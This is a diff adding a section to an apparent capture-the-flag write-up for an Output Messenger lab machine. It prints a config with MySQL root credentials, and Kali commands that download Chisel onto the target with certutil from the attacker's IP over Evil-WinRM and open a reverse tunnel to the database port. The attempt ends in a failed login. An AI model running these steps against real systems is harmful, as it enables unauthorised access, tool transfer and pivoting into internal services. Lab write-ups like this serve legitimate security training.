@@ -1229,3 +1229,84 @@ Contents of `OutputMessenger.exe.config`
   </entityFramework>
 </configuration>
 ```
+
+### 6.2. Connecting to MySQL on target
+
+> [!Note]
+>
+> There's supposed to be a `C:\ProgramData\Output Messenger Server\Temp\OutputMessengerMysql.zip` file that contains `OutputMysql.ini` with MySQL root credentials
+>
+> ```
+> [SETTINGS]
+> SQLPort=14406
+> Version=1.0.0
+> 
+> [DBCONFIG]
+> DBUsername=root
+> DBPassword=ibWijteig5
+> DBName=outputwall
+> 
+> [PATHCONFIG]
+> ;mysql5.6.17
+> MySQL=mysql
+> Log=log
+> def_conf=settings
+> MySQL_data=data
+> Backup=backup
+> ```
+
+#### 6.2.1. Prepare Chisel
+
+Start chisel listener on Kali
+
+```console
+root@kali:~# chisel server --reverse --port 8080
+2024/12/26 16:15:28 server: Reverse tunnelling enabled
+2024/12/26 16:15:28 server: Fingerprint vVivkFQEORVV0Q95jbdroyZ1gDi6pZcpIhGkXFstJlU=
+2024/12/26 16:15:28 server: Listening on http://0.0.0.0:8080
+```
+
+Download Windows Chisel to Kali web server
+
+```sh
+VERSION=$(curl -sI https://github.com/jpillora/chisel/releases/latest | grep location: | cut -d / -f 8 | tr -d '\r' | tr -d 'v')
+curl -sLO https://github.com/jpillora/chisel/releases/download/v$VERSION/chisel_${VERSION}_windows_amd64.gz
+gzip -d chisel_${VERSION}_windows_amd64.gz
+mv chisel_${VERSION}_windows_amd64 /var/www/html/chisel.exe
+```
+
+#### 6.2.2. Establish Chisel connection
+
+On Target:
+
+```cmd
+*Evil-WinRM* PS C:\Users\M.harris\Documents> certutil.exe -urlcache -f -split http://10.10.14.35/chisel.exe .\chisel.exe
+****  Online  ****
+  000000  ...
+  94f000
+CertUtil: -URLCache command completed successfully.
+*Evil-WinRM* PS C:\Users\M.harris\Documents> .\chisel.exe client 10.10.14.35:8080 R:14406:127.0.0.1:14406
+chisel.exe : 2024/12/26 00:26:23 client: Connecting to ws://10.10.14.35:8080
+    + CategoryInfo          : NotSpecified: (2024/12/26 00:2...0.10.14.35:8080:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+2024/12/26 00:26:23 client: Connected (Latency 5.7683ms)
+```
+
+Kali should show connected:
+
+```
+2024/12/26 16:26:23 server: session#1: Client version (1.10.1) differs from server version (1.10.1-0kali1)
+2024/12/26 16:26:23 server: session#1: tun: proxy#R:14406=>14406: Listening
+```
+
+#### 6.2.3. Connect to MySQL
+
+Connect using the `ibWijteig5` password
+
+```sh
+root@kali:~# mysql -h 127.0.0.1 -P 14406  --skip-ssl -u root -p
+Enter password:
+ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: YES)
+```
+
+Seems the box has changed. Giving up...
